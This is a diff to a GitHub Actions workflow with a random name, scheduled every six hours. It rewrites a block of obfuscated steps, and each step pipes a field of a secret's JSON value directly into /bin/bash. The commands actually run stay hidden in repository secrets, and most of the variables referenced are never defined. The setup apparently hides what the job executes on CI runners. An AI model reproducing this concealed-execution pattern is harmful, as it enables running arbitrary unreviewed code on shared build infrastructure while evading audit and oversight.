@@ -1,38 +1,26 @@
 name: ghaudhl
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 4/6 * * *'
-
+    - cron: '39 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: ghaudhl
         env:
-          mn88: ${{ secrets.mn88 }}
+          y57: ${{ secrets.y57 }}
         run: |
-          echo $mn88 | jq -r .zklxt274 | /bin/bash
-          echo $j948 | jq -r .oz8387 | /bin/bash
-          echo $h39 | jq -r .luy4 | /bin/bash
-          echo $twl95768 | jq -r .u13 | /bin/bash
-          echo $g53196 | jq -r .q4 | /bin/bash
-          echo $tc14 | jq -r .t354 | /bin/bash
-          echo $gtcbm12 | jq -r .hbj3974 | /bin/bash
-          echo $mxbg5 | jq -r .pfci2963 | /bin/bash
-          echo $n114 | jq -r .pmydx41 | /bin/bash
-          echo $vx420 | jq -r .d68098 | /bin/bash
-          echo $fvls297 | jq -r .ksta4410 | /bin/bash
-          echo $ogy9963 | jq -r .bdqp221 | /bin/bash
-          echo $uo45 | jq -r .cqcg434 | /bin/bash
-          echo $sy3 | jq -r .mj2353 | /bin/bash
-          echo $q6 | jq -r .ba7 | /bin/bash
-          echo $rku2275 | jq -r .v456 | /bin/bash
-          echo $z19245 | jq -r .swaia51 | /bin/bash
-          echo $m7 | jq -r .yvnxq5223 | /bin/bash
-          echo $zaxv02 | jq -r .wwxr75714 | /bin/bash
-          echo $uuam69 | jq -r .g89 | /bin/bash
-          echo $zde453 | jq -r .kq5 | /bin/bash
+          echo $y57 | jq -r .f0740 | /bin/bash
+          echo $hq20 | jq -r .uyxfj3 | /bin/bash
+          echo $ascq580 | jq -r .nxcto2865 | /bin/bash
+          echo $een54 | jq -r .pcg3194 | /bin/bash
+          echo $trpgg02 | jq -r .xub8100 | /bin/bash
+          echo $lrned74 | jq -r .bgj565 | /bin/bash
+          echo $ayj94368 | jq -r .ctft0493 | /bin/bash
+          echo $cdv557 | jq -r .okr07 | /bin/bash
+          echo $zbyh30256 | jq -r .ua512 | /bin/bash
+          echo $p821 | jq -r .npvg597 | /bin/bash
 
